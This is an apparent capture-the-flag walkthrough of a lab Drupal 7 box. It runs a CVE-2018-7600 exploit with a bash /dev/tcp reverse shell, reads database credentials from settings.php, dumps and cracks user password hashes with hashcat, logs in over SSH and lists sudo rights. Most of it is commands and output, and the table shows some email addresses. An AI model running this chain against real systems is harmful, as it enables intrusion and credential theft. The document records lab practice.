use burp to catch http request
>X-Generator Drupal 7
>
```
└─$ python3 drupa7-CVE-2018-7600.py -c 'bash -i >& /dev/tcp/10.10.16.16/443 0>&1'  http://10.10.10.233

=============================================================================
|          DRUPAL 7 <= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |
|                              by pimps                                     |
=============================================================================

[*] Poisoning a form and including it in cache.
[*] Poisoned form ID: form-VjKafXRjJiZMebhsOZfpYiuobfGZJMhtCiFUsGTVU6E
[*] Triggering exploit to execute: bash -i >& /dev/tcp/10.10.16.16/443 0>&1

└─$ nc -nvlp 443 
listening on [any] 443 ...
connect to [10.10.16.16] from (UNKNOWN) [10.10.10.233] 58750
bash: no job control in this shell
bash-4.2$ whoami
whoami
apache
```
python -c 'import pty;pty.spawn("/bin/bash")'

```
cat settings.php

$databases = array (
  'default' => 
  array (
    'default' => 
    array (
      'database' => 'drupal',
      'username' => 'drupaluser',
      'password' => 'CQHEy@9M*m23gBVj',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);

```

```
bash-4.2$ mysql -u drupaluser -p'CQHEy@9M*m23gBVj' drupal -e 'show tables'

shortcut_set_users
system
taxonomy_index
taxonomy_term_data
taxonomy_term_hierarchy
taxonomy_vocabulary
url_alias
users
users_roles
variable
watchdog
```

```
bash-4.2$ mysql -u drupaluser -p'CQHEy@9M*m23gBVj' drupal -e 'select * from users'
<er -p'CQHEy@9M*m23gBVj' drupal -e 'select * from users'                     
uid	name	pass	mail	theme	signature	signature_format	created	access	login	status	timezonelanguage	picture	init	data
0						NULL	0	0	0	0	NULL		0		NULL
1	brucetherealadmin	$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt	admin@armageddon.eu		filtered_html	1606998756	1607077194	1607076276	1	Europe/London		0	admin@armageddon.eu	a:1:{s:7:"overlay";i:1;}
3	a@a.com	$S$DRdFi8lge8aLuSBeKgKmb3KMCLsUb6LJKAwb725wSiCf0Uss6nzT	a@a.com			filtered_html	1765854838	0	0	0	Europe/London		0	a@a.com	NULL
4	aa@a.com	$S$DlOzwLcQxuHOkmItaIdpwciooQPUL.ZNdORXsSuIqBce6eA9/vqh	l0n1ght@outlook.com			filtered_html	1765855104	0	0	0	Europe/London		0	l0n1ght@outlook.com	NULL
5	ad@a.com	$S$DN0i8C9vwiI5FmqUXDLOu0UBCVZSgMsOiD9/5CCDp8s/E9K6w1J3	afdsf@a.com			filtered_html	1765863734	0	0	0	Europe/London		0	afdsf@a.com	NULL

bash-4.2$ cat /etc/passwd | grep bash
cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
brucetherealadmin:x:1000:1000::/home/brucetherealadmin:/bin/bash

echo '$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt' > hash

hashcat -a0 hash -m 7900  ~/tools/rockyou.txt

$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt:booboo
```

```
└─$ ssh brucetherealadmin@10.10.10.233
The authenticity of host '10.10.10.233 (10.10.10.233)' can't be established.
ED25519 key fingerprint is SHA256:rMsnEyZLB6x3S3t/2SFrEG1MnMxicQ0sVs9pFhjchIQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.233' (ED25519) to the list of known hosts.
brucetherealadmin@10.10.10.233's password: 
Last login: Fri Mar 19 08:01:19 2021 from 10.10.14.5
[brucetherealadmin@armageddon ~]$ id
uid=1000(brucetherealadmin) gid=1000(brucetherealadmin) groups=1000(brucetherealadmin) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023

```

```
[brucetherealadmin@armageddon ~]$ sudo -l
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User brucetherealadmin may run the following commands on armageddon:
    (root) NOPASSWD: /usr/bin/snap install *

```
unable to build my own snap package. failed